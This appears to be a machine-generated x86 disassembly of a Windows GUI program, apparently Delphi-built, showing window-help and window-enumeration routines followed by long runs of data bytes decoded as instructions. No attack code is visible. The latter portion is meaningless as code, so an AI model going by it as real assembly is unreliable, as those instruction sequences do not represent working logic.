mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_44fdcc
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_4081bc
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403fd0
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_44f530
mov eax [ ebp - 0x14 ]
call sub_40443c
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_44fcfc
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408a94
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_44fd57
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408a70
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_44fdcc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40442c
xor eax eax
push ebp
push sub_44fe42
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_44fdb0
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe49
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407f18
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_44fe58
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_44fe74
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_44fdb0
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_44fe54
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_44fe58
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_44fed0
sub_44fed0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_44ff4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44f930
call GetTickCount
mov ebx eax
push 0x0
call sub_40645c
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_44f530
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ff54
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44ff5c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403550
call sub_4058b8
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_44ffa4
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_44ffd0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45003e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450045
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4058a0
mov eax rw-data
call sub_4058a0
mov eax rw-data
call sub_4058a0
mov eax rw-data
call sub_403f7c
mov eax rw-data
call sub_4058a0
mov eax [ rw-data ]
call sub_44f600
sub_450048
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45009a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4500a1
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ff5c
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4058a0
mov edx eax
mov eax [ rw-data ]
call sub_42d764
sub_4500a4
test al 0x0
inc ebp
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
fsubr [ edi ]
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebp
add [ eax ] ch
xor [ ebp ] al
dec eax
xor al 0x40
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 4 + 0x1 ] si
nop
les eax [ eax ]
inc ebp
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc eax
add [ eax + 0x4501 ] al
add [ eax ] al
add [ eax ] al
and [ ecx ] dl
inc eax
add [ esp + esi ] dh
inc eax
add [ eax ] bh
xor [ ebp ] al
sub [ eax ] dh
inc ebp
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
add [ ebp ] eax
xor al 0x0
jae r-xdata
add [ ebx + eax ] dl
inc esp
jb r-xdata
add al bl
das
inc ebp
add [ eax + 0x48004530 ] bl
xor [ ebp ] al
push ss
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
inc ebp
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 4 + 0x1 ] si
inc ebp
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
mov ah 0x1
inc ebp
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc ebp
add [ edi + ebp + 0x2fb00045 ] dh
inc ebp
add [ esi + ebp + 0x2e180045 ] dh
inc ebp
add [ eax + 0x2e ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x340045 ] ah
jb r-xdata
das
inc ebp
add [ ecx + esi ] bh
inc ebp
add [ eax + 0x48004530 ] bl
xor [ ebp ] al
adc al 0x54
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x74 ] si
add eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x40004503 ]
add [ eax ] al
add [ edx + eax + 0x34340045 ] bl
inc eax
add [ eax ] bh
xor [ ebp ] al
pop esp
xor [ ebp ] eax
dec eax
xor al 0x40
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
les esi [ eax ]
inc ebp
add al bh
xor [ ebp ] al
adc [ ecx ] dh
inc ebp
add [ esi + ebp + 0x306c0045 ] dh
inc ebp
add [ eax + 0x2e ] bh
inc ebp
add [ ecx + esi ] bl
inc ebp
add al dl
inc ebp
add [ eax ] al
add [ eax ] al
fadd [ ecx ]
inc ebp
add [ esp + esi ] dh
inc eax
add [ eax ] bh
xor [ ebp ] al
sub [ eax ] dh
inc ebp
add [ eax + 0x34 ] cl
inc eax
add [ eax ] al
adc al 0x3
inc ebx
outsd
outsb
je r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
les esi [ eax ]
inc ebp
add [ edi + ebp + 0x2fb00045 ] dh
inc ebp
add [ esi + ebp + 0x306c0045 ] dh
inc ebp
add [ eax + 0x2e ] bh
inc ebp
add ah cl
das
inc ebp
add al dl
das
inc ebp
add [ ebx + 0x450224c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] dl
inc ebp
add [ eax + eax ] bh
add [ eax ] al
xor al 0x1
inc ebp
add [ esp + esi ] dh
inc eax
add [ eax ] bh
xor [ ebp ] al
sub [ eax ] dh
inc ebp
add [ eax + 0x34 ] cl
inc eax
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
fadd [ eax ]
inc ebp
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add al bl
add [ ebp ] al
push es
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebp
add [ ebx + esi ] bh
inc ebp
add [ eax - 0x4bffbad1 ] dh
inc ebp
add ah dh
xor [ ebp ] eax
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ esp + esi ] bh
xor [ ebp ] al
dec eax
xor al 0x40
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x6c ] si
add al [ ebp ]
pop es
push ss
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 2 + 0x4 ] si
inc ebp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax + 0x4 ] si
inc ebp
add [ eax + 0x2 ] ch
inc ebp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebp
add ah cl
das
inc ebp
add al dl
das
inc ebp
add al bl
das
inc ebp
add [ eax + 0x32 ] dl
inc ebp
add [ eax + 0x31 ] ah
inc ebp
add [ eax + 0x14004532 ] bl
xor eax [ ebp ]
sub [ ebx ] dh
inc ebp
add [ eax + 0x33 ] cl
inc ebp
add [ edi ] cl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
add al 0x4
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
inc ebp
add [ eax ] dh
add [ eax ] al
fadd [ ecx ]
inc ebp
add [ esp + esi ] dh
inc eax
add [ eax ] bh
xor [ ebp ] al
sub [ eax ] dh
inc ebp
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah al
xor [ ebp ] eax
les esi [ eax ]
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
les esi [ eax ]
inc ebp
add al bh
xor [ ebp ] al
adc [ ecx ] dh
inc ebp
add [ esi + ebp + 0x306c0045 ] dh
inc ebp
cmp al 0x34
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor [ eax ] eax
fdiv [ ecx ]
inc eax
add [ eax + 0x2e ] dh
outsd
insd
add al bl
das
inc ebp
add [ eax + 0x32 ] dl
inc ebp
add [ eax + 0x31 ] ah
inc ebp
add [ eax + 0x14004532 ] bl
xor eax [ ebp ]
sub [ ebx ] dh
inc ebp
add [ eax + 0x33 ] cl
inc ebp
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc ebp
add [ esp + esi ] dh
inc eax
inc esp
outsd
inc ebx
outsd
outsb
je r-xdata
int3
je r-xdata
inc ecx
add al bl
xchg ebx eax
inc ecx
add [ eax + ebx * 2 + 0x58800042 ] dl
inc edx
add [ ebp + eax * 2 + 0x45 ] cl
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
add [ eax ] bh
xor [ ebp ] al
push eax
xor eax [ ebp ]
dec eax
xor al 0x40
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah al
xor [ ebp ] eax
les esi [ eax ]
inc ebp
add [ ebx + esi ] bh
inc ebp
add [ eax - 0x4bffbad1 ] dh
inc ebp
add ah dh
xor [ ebp ] eax
js r-xdata
add [ ebx + 0x4504c8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x700045 ] al
add [ eax ] al
mov eax 0x34004503
xor al 0x40
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
add eax 0x45
inc ebp
add ah cl
das
inc ebp
add al dl
das
inc ebp
add [ eax + 0x2e ] bh
inc ebp
add [ ecx + esi ] bl
inc ebp
add al dl
das
inc ebp
add [ eax ] dl
xor [ ebp ] eax
mov ah 0x2e
inc ebp
add [ eax + esi + 0x45 ] ch
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + 0x2 ] si
inc ebp
add [ eax + 0x4501 ] dh
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebp
add ah cl
das
inc ebp
add al dl
das
inc ebp
add al bl
das
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
xor al 0x40
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
xor [ edx ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax ] ah
inc ebp
inc ebp
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ebp
add [ eax + eax ] ah
inc ebp
add [ ecx + esi ] bh
inc ebp
add [ eax + 0x48004530 ] bl
xor [ ebp ] al
adc dl [ esp + eax * 2 + 0x72 ]
popad
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x45069890
add [ ebx ] al
or al 0x54
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
inc edx
add [ eax + 0x7c004547 ] dl
sbb eax [ edx ]
mov al 0x49
inc ebp
add [ eax + 0x5c00421b ] dh
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
jae r-xdata
add [ ebp + 0x2e80040 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax + 0x45 ] bl
outsd
insd
popad
je r-xdata
inc ebp
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
add eax 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ eax ] al
nop
add eax 0xe070045
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
dec edx
inc ebp
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c454840
dec eax
inc ebp
add al ah
push ds
inc edx
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
dec eax
xor al 0x40
outsd
insb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
pop es
inc ebp
add [ ebx ] cl
jae r-xdata
xchg esp eax
pop es
inc ebp
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + eax + 0x6d060045 ] dl
add [ eax - 0x4fffbab7 ] dh
sbb eax [ edx ]
pop esp
dec eax
sbb eax [ edx ]
nop
jae r-xdata
dec ebp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
push esp
popad
inc eax
add [ eax ] dl
or [ ebp ] al
push es
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
pop es
inc ebp
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
rcl [ edi + eax ] 0x45
pop es
inc ebp
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
inc edi
inc ebp
add [ ebx + ebx + 0x42 ] bh
add eax 0x316c0045
inc edx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
inc ebp
inc esi
add esp eax
pop es
add [ ecx ] ecx
push esp
inc ebp
outsb
je r-xdata
or [ ecx + 0x6b ] ah
inc edx
outsd
je r-xdata
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
jbe r-xdata
outsd
insb
jae r-xdata
inc esi
add [ eax ] dl
dec ecx
inc ebp
add [ eax ] cl
pop ds
inc esi
add [ edi + ebx ] bl
inc esi
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add [ edi + ebx + 0x49f80046 ] bl
inc ebp
add [ edi + ebx + 0x4b0c0046 ] ah
inc ebp
add ah ch
dec edx
inc ebp
add [ ebx + ecx * 2 ] ch
inc ebp
add [ eax ] bl
dec edx
inc ebp
add [ eax - 0x43ffb9e1 ] bh
pop ds
inc esi
add [ edx + ecx * 2 ] bh
inc ebp
add [ edi + eax * 2 + 0x54120045 ] ch
inc ebx
outsd
outsb
je r-xdata
inc edx
add [ eax + ecx * 2 + 0x1ee00045 ] bl
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
and [ eax ] cl
inc ebp
add [ eax ] dl
add [ eax ] al
push eax
inc esi
inc ebp
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x45082074
jb r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ebx + edx * 4 + 0x46a80041 ] ch
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
inc ebp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax ] al
xchg esp eax
push es
inc ebp
add [ esi ] al
insd
push es
inc ebp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebp + 0x6040040 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004506 ] al
add [ eax ] al
add [ eax + 0x34004618 ] bl
xor al 0x40
add [ eax + 0x34 ] al
inc eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
je r-xdata
add bh bh
or [ ebp ] al
adc al 0x0
adc [ eax ] al
add bh bh
or [ ebp ] al
imul ebp [ esi + 0x74 ] 0x45088c73
add al bh
inc cx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
add ah al
xchg esp eax
inc ecx
add al bl
xchg ebx eax
inc ecx
add [ edi + eax * 2 + 0x45 ] bh
add [ esi + eax * 2 + 0x45 ] ch
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
jae r-xdata
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] 0x7bcc08b
inc ebp
add [ eax + 0x74614454 ] al
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
pushad
pop es
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
add [ ebx + 0x4509ecc0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
add [ esi + eax + 0x5f6c0045 ] dl
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
lea eax [ eax ]
je r-xdata
add [ eax + eax ] dl
inc ebp
outsd
insb
jae r-xdata
popad
js r-xdata
jb r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
inc ebp
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add ah al
add eax ecx
pop es
inc ebp
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
outsb
mov eax eax
mov esp 0x4004507
add eax 0x74614454
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx + edx + 0x40 ] dh
add [ eax + 0x6c004010 ] al
pop edi
inc ecx
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
inc ebp
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] cl
add [ eax ] al
push eax
inc esi
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ eax ] ah
or [ ebp ] al
or [ eax ] al
add bh bh
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
mov eax 0x7004508
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
dec esp
popad
arpl [ eax + 0x6f ] bp
jb r-xdata
add ecx [ ebx ]
push esp
inc ecx
outsb
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ ecx + edx + 0x40 ] dh
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
add [ eax + r-xdata ] dl
adc [ eax ] 0x40
add [ edi + ebx * 2 + 0x41 ] ch
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x45082074
imul esp [ gs : edi + 0x68 ] 0x45082074
add [ eax + eax ] cl
add bh bh
add [ ecx ] al
add [ eax ] al
add ah dl
push es
inc ebp
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc ebp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ eax + 0x7 ] ah
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
je r-xdata
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
or [ esi ] cl
push esp
inc esp
jb r-xdata
add [ eax + r-xdata ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] dl
pop es
inc eax
inc esp
jb r-xdata
jbe r-xdata
push esp
dec ebx
jns r-xdata
inc ebp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
